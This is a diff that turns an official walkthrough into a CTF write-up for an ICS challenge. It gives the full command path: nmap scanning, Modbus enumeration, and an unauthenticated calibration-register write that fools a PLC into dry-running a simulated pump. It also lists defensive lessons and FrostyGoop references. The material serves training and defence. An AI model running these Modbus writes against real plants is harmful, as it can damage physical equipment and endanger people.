@@ -1,78 +1,88 @@
-# The Last Bottle — official walkthrough
+# Breaking the Last Bottle: an ICS Modbus CTF write-up
 
-> **Spoiler warning:** This document contains the complete solution, register
-> map, damaging write and flag evidence. Do not provide it to players during a
-> live event. All commands apply only to the isolated challenge network.
+> **Spoilers ahead.** This is the complete solution to *The Last Bottle*. Run
+> these commands only inside the isolated challenge environment.
 
-## Result
-
-The challenge is an integrity and availability failure in an industrial
-control process. A player on the supplied maintenance workstation can issue an
-unauthenticated Modbus/TCP write to RIO-101's level-transmitter calibration
-register. PLC-101 trusts the resulting false-high measurement, makes unsafe
-control decisions, and eventually dry-runs transfer pump P-101 until the
-independent physical model marks it permanently broken.
-
-The essential vulnerability is:
-
-> A reachable Modbus/TCP server accepts an unauthorized write to a
-> safety-relevant calibration register, and the PLC trusts the manipulated
-> measurement without an independent physical protection layer.
-
-This is not an HMI or web exploit. It is abuse of an unauthenticated industrial
-communications protocol and an unsafe process trust relationship.
-
-## ICS primer
-
-The lab separates the major roles found in a small industrial environment:
-
-| Component | Meaning in this lab |
+| | |
 |---|---|
-| Physical process | The simulated tank, inlet, liquid, pump, temperature, vibration and damage |
-| RIO / Remote I/O | Interfaces with the tank-level sensor and publishes its value over Modbus |
-| PLC | Repeatedly reads sensor data and decides when the inlet and pump should run |
-| HMI | The operator's graphical screen for values, alarms and commands |
-| SCADA | The wider supervisory layer containing the HMI, telemetry and alarms |
-| Modbus/TCP | The register-based protocol used by the controller and field device, normally on TCP/502 |
+| Category | ICS / OT |
+| Difficulty | Beginner to intermediate |
+| Protocol | Modbus/TCP |
+| Starting point | Line 4 maintenance workstation |
+| Objective | Permanently break transfer pump P-101 and claim the proof token |
+| Flag format | `flag{...}` |
 
-The HMI is not the controller. PLC-101 continues executing its scan cycle even
-when nobody has the HMI open. The player can therefore communicate directly
-with the PLCs and RIO using Modbus.
+## TL;DR
 
-Modbus register references use conventional ranges in this lab:
+The maintenance workstation can write to an unauthenticated Modbus holding
+register on the tank-level Remote I/O device. That register is a calibration
+bias. Setting it to `+100.00%` makes the PLC believe the tank is full even as
+the real tank empties. The pump eventually runs dry, reaches 100% simulated
+damage, and the independent checker releases the flag.
 
-- `3xxxx` input registers hold read-only measurements and status;
-- `4xxxx` holding registers hold readable and potentially writable parameters;
-- `30001` and `40001` both correspond to zero-based protocol offset `0`, but
-  they belong to different register tables.
+The final primitive is only one command:
 
-## 1. Enter the maintenance workstation
+```sh
+mbcli write 172.30.10.13 40001 10000
+```
 
-Connect using the challenge host supplied by the organizer:
+Finding the correct device and register, and understanding why that command
+breaks a machine, is the actual challenge.
+
+## The plant in one minute
+
+![The Last Bottle architecture](assets/architecture.png)
+
+You do not need previous ICS experience, but four components matter:
+
+- **RIO-101** reads the physical tank-level sensor and publishes the value.
+- **PLC-101** reads that value and controls the inlet and transfer pump.
+- **HMI/SCADA** shows operators what the PLC believes is happening.
+- **The plant model** owns the real tank and pump state. The checker trusts
+  this state, not whatever number is displayed by the HMI.
+
+The devices exchange values through **Modbus/TCP**, usually on port 502.
+Modbus organizes data into register tables. In this challenge, `3xxxx` input
+registers contain read-only measurements, while `4xxxx` holding registers
+contain parameters that may be writable.
+
+That distinction becomes important later.
+
+## Getting a foothold
+
+The supplied SSH account drops us onto a maintenance workstation inside the
+Line 4 control VLAN:
 
 ```sh
 ssh player@CHALLENGE_HOST -p 2224
 ```
 
-The banner defines the target, allowed control-network range and installed
-tools.
+![Challenge briefing after SSH login](assets/screenshots/01-player-brief.png)
 
-![Player briefing shown after SSH login](assets/screenshots/01-player-brief.png)
+The brief gives us three useful facts:
 
-## 2. Discover the control-network assets
+1. the authorized control-network range is `172.30.10.0/24`;
+2. production reported contradictory level and dry-run indications;
+3. the flag is released only after a real simulated equipment failure.
 
-Start with host discovery. This is much faster than immediately running a
-full-port scan against all 256 addresses:
+This immediately suggests an integrity problem: the controller may be acting
+on a process value that does not match reality.
+
+## Recon: finding the control devices
+
+I started with host discovery instead of launching a 65,535-port scan against
+all 256 addresses:
 
 ```sh
 nmap -sn -n 172.30.10.0/24
 ```
 
-![Live-host discovery](assets/screenshots/02-network-discovery.png)
+![Live hosts on the control VLAN](assets/screenshots/02-network-discovery.png)
 
-The responsive addresses are `.1`, `.11`, `.12`, `.13`, `.20` and `.50`.
-`.1` is the Docker-network gateway and `.50` is the supplied workstation. Scan
-the candidate industrial hosts:
+The interesting addresses are `.11`, `.12`, `.13` and `.20`. Address `.1` is
+the network gateway, while `.50` is our own workstation.
+
+Now we can scan only the four candidates:
 
 ```sh
 nmap -sT -Pn -n -p- --open --min-rate 3000 --max-retries 1 \
@@ -81,22 +91,33 @@ nmap -sT -Pn -n -p- --open --min-rate 3000 --max-retries 1 \
 
 ![Targeted service discovery](assets/screenshots/06-live-host-and-service-discovery.png)
 
-The scan finds Modbus/TCP on `.11`, `.12` and `.13`, plus the internal HMI on
-`.20:8080`. Port 502 is internal to the lab and is not exposed by the VPS.
+The result gives us three Modbus endpoints and one web interface:
 
-### Why the first `/24` port scan was slow
+```text
+172.30.10.11:502   Modbus/TCP
+172.30.10.12:502   Modbus/TCP
+172.30.10.13:502   Modbus/TCP
+172.30.10.20:8080  HMI
+```
 
-A full TCP scan sends probes for 65,535 ports to every address. Most unused
-addresses silently drop those probes, making Nmap wait for retries and
-round-trip-time estimates:
+The HMI is useful for visual context, but it is not required to solve the
+challenge. We can stay entirely at the protocol layer.
 
-![Unnecessarily broad full-port scan and RTT warnings](assets/screenshots/05-full-subnet-scan-timeout.png)
+<details>
+<summary>Why was the first full-subnet scan so slow?</summary>
 
-The two-stage host-discovery and targeted-scan method avoids that delay.
+A full TCP scan of `/24` probes more than 16 million address/port pairs. Unused
+addresses silently drop traffic, forcing Nmap to wait and retry. Discovering
+live hosts first reduces the problem to four systems.
 
-## 3. Identify the Modbus devices
+![Nmap RTT warnings from an unnecessarily broad scan](assets/screenshots/05-full-subnet-scan-timeout.png)
 
-Query the standard Modbus device-identification objects:
+</details>
+
+## Enumeration: which device matters?
+
+An open Modbus port tells us very little by itself. The next step is to request
+each device's standard identity objects:
 
 ```sh
 mbcli identify 172.30.10.11
@@ -104,63 +125,68 @@ mbcli identify 172.30.10.12
 mbcli identify 172.30.10.13
 ```
 
-![Modbus device identities](assets/screenshots/07-modbus-device-identification.png)
+![Device identification for all three Modbus systems](assets/screenshots/07-modbus-device-identification.png)
 
-The identities provide the key distinction:
+The names explain the process topology:
 
-```text
-172.30.10.11  PLC101 — Tank and Transfer Pump Controller
-172.30.10.12  PLC102 — Bottle Conveyor Controller
-172.30.10.13  RIO101 — LT-101 Remote I/O Gateway / Tank Level
-```
+| Address | Identity | Relevance |
+|---|---|---|
+| `172.30.10.11` | PLC-101: Tank and Transfer Pump Controller | Controls the machine we must break |
+| `172.30.10.12` | PLC-102: Bottle Conveyor Controller | Unrelated production context |
+| `172.30.10.13` | RIO-101: LT-101 Remote I/O Gateway | Supplies the tank-level measurement |
 
-PLC-102 controls an unrelated conveyor. PLC-101 is the controller whose pump
-must fail, but RIO-101 is the source of the contradictory tank-level value.
-That makes `.13` the logical place to investigate sensor-data manipulation.
+This is the key deduction. PLC-101 is the **victim controller**, but RIO-101 is
+the **source of the suspicious data**. If the level indication is
+contradictory, `.13` is the logical place to investigate.
 
-In short, `.11` is the controller affected by the attack; `.13` is the
-vulnerable source of the data that drives its decision.
+## Following the tank-level signal
 
-## 4. Observe live RIO telemetry
-
-Read two input registers starting at reference 30001:
+I read two input registers from RIO-101:
 
 ```sh
 mbcli read-input 172.30.10.13 30001 2
 ```
 
-![Initial RIO input-register read](assets/screenshots/08-rio-input-registers.png)
+![First RIO input-register read](assets/screenshots/08-rio-input-registers.png)
 
-Repeated reads show that `30001` changes with the physical tank level, while
-`30002` remains `1`:
+Repeating the command shows that the first value moves with the process while
+the second stays at `1`:
 
-![Changing tank-level telemetry with good sensor quality](assets/screenshots/09-dynamic-level-telemetry.png)
+![The level changes while sensor quality remains good](assets/screenshots/09-dynamic-level-telemetry.png)
 
-Therefore:
+From that behavior we can infer:
 
-- `30001` is the reported level, scaled by `0.01%`;
-- `30002` is the communication-quality value, where `1` means good.
+```text
+30001  reported tank level, scaled by 0.01%
+30002  sensor communication quality, where 1 means good
+```
 
-## 5. Find the writable boundary
+The important detail is that the device claims the measurement is healthy.
+The PLC has no obvious reason to distrust it.
 
-Field transmitters commonly expose measurements as input registers and
-maintenance or calibration parameters as holding registers. Test the first
-holding-register reference and the next address:
+## Looking for a writable parameter
+
+Measurements normally live in input registers, while calibration and
+maintenance settings commonly live in holding registers. I checked the first
+holding-register reference and then the next address:
 
 ```sh
 mbcli read-holding 172.30.10.13 40001 1
 mbcli read-holding 172.30.10.13 40002 1
 ```
 
-![Only RIO holding register 40001 exists](assets/screenshots/10-rio-holding-register-boundary.png)
+![RIO-101 exposes only holding register 40001](assets/screenshots/10-rio-holding-register-boundary.png)
 
-Register `40001` exists and begins at zero. Register `40002` returns an
-illegal-address failure. The deliberately bounded map lets the player identify
-one candidate parameter without blindly corrupting a large address range.
+Register `40001` exists and contains zero. Register `40002` returns an illegal
+address error. The map is deliberately small, leaving one plausible
+maintenance parameter to test.
 
-## 6. Prove the calibration relationship safely
+The output also shows `offset 0`. That is normal Modbus notation: human-facing
+reference `40001` maps to zero-based holding-register offset `0`.
 
-Apply a small positive value:
+## Testing the hypothesis safely
+
+Before making a destructive change, I used a small and reversible value:
 
 ```sh
 mbcli write 172.30.10.13 40001 500
@@ -168,40 +194,51 @@ mbcli read-input 172.30.10.13 30001 2
 mbcli read-holding 172.30.10.13 40001 1
 ```
 
-![Small calibration write and changed reported level](assets/screenshots/11-small-calibration-write.png)
+![A small write changes the reported tank level](assets/screenshots/11-small-calibration-write.png)
 
-The holding register now contains `500`, representing a `+5.00%` bias, and the
-reported level increases accordingly. Normal inlet and pump activity can move
-the underlying physical level during this comparison.
+The holding register now contains `500`, and the reported level rises by
+approximately five percentage points. That tells us the register is a signed
+calibration bias with a `0.01%` scale.
 
-Restore the original value before the final test:
+I restored it before continuing:
 
 ```sh
 mbcli write 172.30.10.13 40001 0
 ```
 
-![Calibration restored to zero](assets/screenshots/12-calibration-restored.png)
+![Calibration bias restored to zero](assets/screenshots/12-calibration-restored.png)
 
-This reversible test establishes the register's meaning and provides a useful
-negative control: restoring the value removes the injected bias.
+At this point the vulnerability is proven: any reachable Modbus client can
+change a trusted sensor calibration parameter without authenticating.
 
-## 7. Inject the false-high measurement
+## Exploitation: lying to the PLC
 
-Write a `+100.00%` calibration bias:
+The destructive test sets the calibration bias to `+100.00%`:
 
 ```sh
 mbcli write 172.30.10.13 40001 10000
 ```
 
-![Final false-high calibration write](assets/screenshots/13-final-false-level-write.png)
+![The final false-high calibration write](assets/screenshots/13-final-false-level-write.png)
 
-The request succeeds without credentials, a client certificate, a source-host
-allowlist or any application authorization. This is a Modbus function-code 06
-write to a single holding register.
+The write is a valid Modbus function-code 06 request. It succeeds without a
+password, client certificate, source-host allowlist or application-level
+authorization.
 
-## 8. Verify the cyber-physical consequence
+Here is what happens next:
 
-Read the ten PLC-101 telemetry registers periodically:
+![Causal chain from Modbus write to pump damage](assets/attack-chain.png)
+
+RIO-101 adds the malicious bias to the real sensor value. PLC-101 sees a full
+tank, closes the inlet, and continues the transfer sequence. The actual tank
+eventually empties, but the reported level remains high enough to satisfy the
+PLC's low-level permissive. P-101 runs dry and accumulates damage.
+
+## Watching the machine fail
+
+PLC-101 exposes its process state through ten input registers. This portable
+loop avoids the `xterm-kitty` terminfo error produced by `watch` in the minimal
+player container:
 
 ```sh
 for i in $(seq 1 30); do
@@ -211,133 +248,163 @@ for i in $(seq 1 30); do
 done
 ```
 
-This portable loop is used instead of `watch`, which may reject the player's
-`xterm-kitty` terminal type.
+Once the failure is complete, a final read shows:
 
-The false-high level causes PLC-101 to close the inlet while continuing the
-transfer sequence. The physical tank eventually empties, the pump dry-runs,
-and the independent model accumulates terminal damage.
+![PLC-101 after terminal pump failure](assets/screenshots/14-terminal-machine-failure.png)
 
-![PLC telemetry after terminal pump failure](assets/screenshots/14-terminal-machine-failure.png)
-
-The final values are:
-
-| Reference | Raw value | Interpretation |
+| Register | Raw value | Meaning |
 |---:|---:|---|
-| 30001 | 10000 | controller-reported level = 100.00% |
-| 30006 | 149 | latched dry-run duration = 14.9 seconds |
-| 30007 | 10000 | pump damage = 100.00% |
-| 30009 | 1 | dry-run alarm active |
-| 30010 | 3 | machine state = BROKEN |
+| 30001 | 10000 | Reported tank level = 100.00% |
+| 30006 | 149 | Dry-run duration = 14.9 seconds |
+| 30007 | 10000 | Pump damage = 100.00% |
+| 30009 | 1 | Dry-run alarm active |
+| 30010 | 3 | Machine state = `BROKEN` |
 
-## 9. Claim the proof token
+This is more than a display change. The independent physical model has
+recorded terminal equipment damage.
 
-Use the supplied checker endpoint. From the lab workstation, the explicitly
-provided checker is also reachable on its edge-network address:
+## Capturing the flag
+
+From the supplied workstation, the lab checker is reachable on the edge
+network:
 
 ```sh
 curl http://172.30.30.30:8080/api/claim
 ```
 
-For a normal player handout, use the public endpoint instead:
+Players can also use the public endpoint supplied by the organizer:
 
 ```sh
 curl http://CHALLENGE_HOST:8090/api/claim
 ```
 
-![Checker response confirming solved state and returning an instance flag](assets/screenshots/15-flag-claimed.png)
+![The checker validates the failure and returns the flag](assets/screenshots/15-flag-claimed.png)
 
-The response reports `solved: true`, `machine_state: BROKEN`, damage of 100%,
-and an instance-specific `flag{...}` token.
-
-## Complete causal chain
+The response confirms all three conditions:
 
 ```text
-Player reaches RIO-101 over the control VLAN
-        ↓
-Unauthenticated Modbus FC06 write changes 40001
-        ↓
-RIO reports actual level + malicious calibration bias
-        ↓
-PLC-101 trusts the false-high LT-101 measurement
-        ↓
-Inlet closes while transfer operation continues
-        ↓
-The independent physical tank empties
-        ↓
-P-101 dry-runs, overheats and reaches 100% simulated damage
-        ↓
-The independent checker releases the proof token
+machine_state = BROKEN
+pump_damage   = 100.0
+solved        = true
 ```
 
-Changing a displayed value alone is insufficient. The checker reads the
-authoritative plant model, not the PLC or HMI register image, and releases the
-flag only after sustained dry running causes terminal physical state.
+Flag obtained: `flag{...}`.
 
-## Vulnerability classification
+## So, what was the vulnerability?
 
-The solve combines several weaknesses:
+The short answer is **an unauthenticated write to a trusted Modbus holding
+register**.
 
-1. the player workstation can reach safety-relevant field I/O;
-2. classic Modbus/TCP provides no client authentication or message integrity;
-3. RIO-101 accepts writes from any reachable Modbus client;
-4. a safety-relevant calibration register has no effective range restriction;
-5. PLC-101 relies on one network-derived level measurement;
-6. no independent hardwired low-level trip prevents pump damage.
+The complete failure required several weaknesses to line up:
 
-The scenario is threat-informed by FrostyGoop, whose documented behavior
-included interacting with industrial devices over Modbus/TCP and reading or
-writing holding registers to manipulate operation. This lab is an original,
-fictional process and does not reproduce the malware or a victim product.
+1. the maintenance workstation could reach field I/O over the control VLAN;
+2. classic Modbus/TCP did not authenticate the sender or protect message
+   integrity;
+3. RIO-101 accepted a write from any reachable client;
+4. the calibration value had no safe engineering-range restriction;
+5. PLC-101 trusted one network-derived level value;
+6. no independent hardwired low-level trip protected the pump.
 
-Relevant ATT&CK for ICS techniques include:
+The PLC logic was not bypassed and its program was not modified. It made a
+locally correct decision using false information.
 
-- [T0801 — Monitor Process State](https://attack.mitre.org/techniques/T0801/)
-- [T0836 — Modify Parameter](https://attack.mitre.org/techniques/T0836/)
-- [T0869 — Standard Application Layer Protocol](https://attack.mitre.org/techniques/T0869/)
-- [T1692.001 — Unauthorized Message: Command Message](https://attack.mitre.org/techniques/T1692/001/)
-- [T0832 — Manipulation of View](https://attack.mitre.org/techniques/T0832/)
-- [T0879 — Damage to Property](https://attack.mitre.org/techniques/T0879/), simulated only
+## How FrostyGoop relates to the challenge
 
-References:
+The scenario is behaviorally inspired by the FrostyGoop incident, not by the
+malware's implementation. Dragos reported Modbus commands being sent to ENCO
+controllers during a disruptive Ukrainian district-heating incident, causing
+inaccurate measurements and system malfunctions. MITRE records that
+FrostyGoop can read and write holding registers over Modbus/TCP.
 
-- [MITRE ATT&CK S1165 — FrostyGoop](https://attack.mitre.org/software/S1165/)
-- [Dragos — Protect Against FrostyGoop ICS Malware](https://www.dragos.com/blog/protect-against-frostygoop-ics-malware-targeting-operational-technology)
-- [Modbus Organization — Modbus Security](https://www.modbus.org/news/modbus-security-new-protocol-to-improve-control-system-security)
+| Documented behavior | Safe lab adaptation |
+|---|---|
+| Communicate over Modbus TCP/502 | Use `mbcli` over the isolated control VLAN |
+| Read and write holding registers | Discover and change RIO register 40001 |
+| Modify operational parameters | Change the level-transmitter calibration |
+| Cause inaccurate measurements | Report a false-high tank level |
+| Disrupt an industrial process | Dry-run a simulated transfer pump |
 
-## Defensive lessons
+The challenge does not reproduce FrostyGoop code, ENCO hardware, exact
+register maps, the victim environment or its initial-access method.
 
-- Segment PLCs and field I/O by function and allow only required peers.
-- Restrict Modbus write function codes and register ranges at an industrial
-  firewall or protocol-aware gateway.
-- Authenticate endpoints and protect message integrity with Modbus Security or
-  an authenticated tunnel where device support permits it.
-- Alert on writes to calibration, setpoint and safety-relevant parameters.
-- Apply engineering range checks and change-control requirements to calibration
-  values.
-- Use an independent sensor or hardwired low-level trip for a damaging pump
-  failure mode.
-- Compare controller telemetry with independent physical invariants.
+Relevant references:
 
-## Evidence index
+- [Dragos: Protect Against FrostyGoop ICS Malware](https://www.dragos.com/blog/protect-against-frostygoop-ics-malware-targeting-operational-technology)
+- [MITRE ATT&CK S1165: FrostyGoop](https://attack.mitre.org/software/S1165/)
+- [Modbus Organization: Modbus Security](https://www.modbus.org/news/modbus-security-new-protocol-to-improve-control-system-security)
 
-All captured images are retained in sequence under
-[`assets/screenshots`](assets/screenshots/):
+The closest ATT&CK for ICS mappings are Monitor Process State (`T0801`),
+Modify Parameter (`T0836`), Standard Application Layer Protocol (`T0869`) and
+Commonly Used Port (`T0885`). Unauthorized Message: Command Message
+(`T1692.001`) also describes the lab's command primitive, although MITRE does
+not currently list it directly on the FrostyGoop software page.
+
+## Defensive takeaways
+
+- Allow only the PLC and authorized engineering stations to reach RIO-101.
+- Filter Modbus write function codes and permitted address ranges.
+- Alert on changes to calibration, setpoint and safety-relevant registers.
+- Enforce engineering limits and change approval for calibration values.
+- Use Modbus Security or an authenticated tunnel where supported.
+- Add an independent sensor or hardwired low-level pump trip.
+- Compare controller telemetry against independent physical invariants.
+
+## Command path
+
+For reference, the complete solve can be reduced to:
+
+```sh
+nmap -sn -n 172.30.10.0/24
+nmap -sT -Pn -n -p- --open --min-rate 3000 --max-retries 1 \
+  172.30.10.11-13 172.30.10.20
+
+mbcli identify 172.30.10.11
+mbcli identify 172.30.10.12
+mbcli identify 172.30.10.13
+
+mbcli read-input 172.30.10.13 30001 2
+mbcli read-holding 172.30.10.13 40001 1
+mbcli read-holding 172.30.10.13 40002 1
+
+mbcli write 172.30.10.13 40001 500
+mbcli write 172.30.10.13 40001 0
+mbcli write 172.30.10.13 40001 10000
+
+mbcli read-input 172.30.10.11 30001 10
+curl http://172.30.30.30:8080/api/claim
+```
+
+## Additional evidence
+
+The main narrative uses the most useful screenshots. The complete manual solve
+is preserved below:
 
 | # | Evidence |
 |---:|---|
-| 01 | [Player SSH brief](assets/screenshots/01-player-brief.png) |
-| 02 | [Initial network discovery](assets/screenshots/02-network-discovery.png) |
-| 03 | [Focused PLC-101 port scan](assets/screenshots/03-plc101-port-scan.png) |
-| 04 | [PLC-101 device identity](assets/screenshots/04-plc101-identification.png) |
-| 05 | [Slow full-subnet scan behavior](assets/screenshots/05-full-subnet-scan-timeout.png) |
-| 06 | [Efficient host and service discovery](assets/screenshots/06-live-host-and-service-discovery.png) |
-| 07 | [All Modbus device identities](assets/screenshots/07-modbus-device-identification.png) |
-| 08 | [Initial RIO input-register values](assets/screenshots/08-rio-input-registers.png) |
+| 01 | [Player brief](assets/screenshots/01-player-brief.png) |
+| 02 | [Network discovery](assets/screenshots/02-network-discovery.png) |
+| 03 | [Focused PLC-101 scan](assets/screenshots/03-plc101-port-scan.png) |
+| 04 | [PLC-101 identity](assets/screenshots/04-plc101-identification.png) |
+| 05 | [Slow-scan troubleshooting](assets/screenshots/05-full-subnet-scan-timeout.png) |
+| 06 | [Efficient service discovery](assets/screenshots/06-live-host-and-service-discovery.png) |
+| 07 | [Modbus device identities](assets/screenshots/07-modbus-device-identification.png) |
+| 08 | [Initial RIO inputs](assets/screenshots/08-rio-input-registers.png) |
 | 09 | [Dynamic level telemetry](assets/screenshots/09-dynamic-level-telemetry.png) |
-| 10 | [Bounded RIO holding-register map](assets/screenshots/10-rio-holding-register-boundary.png) |
-| 11 | [Small reversible calibration test](assets/screenshots/11-small-calibration-write.png) |
+| 10 | [Holding-register boundary](assets/screenshots/10-rio-holding-register-boundary.png) |
+| 11 | [Small calibration test](assets/screenshots/11-small-calibration-write.png) |
 | 12 | [Calibration restored](assets/screenshots/12-calibration-restored.png) |
-| 13 | [Final false-high write](assets/screenshots/13-final-false-level-write.png) |
-| 14 | [Terminal physical failure](assets/screenshots/14-terminal-machine-failure.png) |
-| 15 | [Checker validation and flag](assets/screenshots/15-flag-claimed.png) |
+| 13 | [False-high write](assets/screenshots/13-final-false-level-write.png) |
+| 14 | [Terminal machine failure](assets/screenshots/14-terminal-machine-failure.png) |
+| 15 | [Flag validation](assets/screenshots/15-flag-claimed.png) |
+
+## Conclusion
+
+The interesting part of this challenge is not that Modbus accepts a write. It
+is how one trusted value crosses several layers:
+
+```text
+network command → sensor data → PLC decision → physical consequence
+```
+
+That is the defining lesson of ICS security: a message can be perfectly valid
+at the protocol layer and still be dangerous to the process.
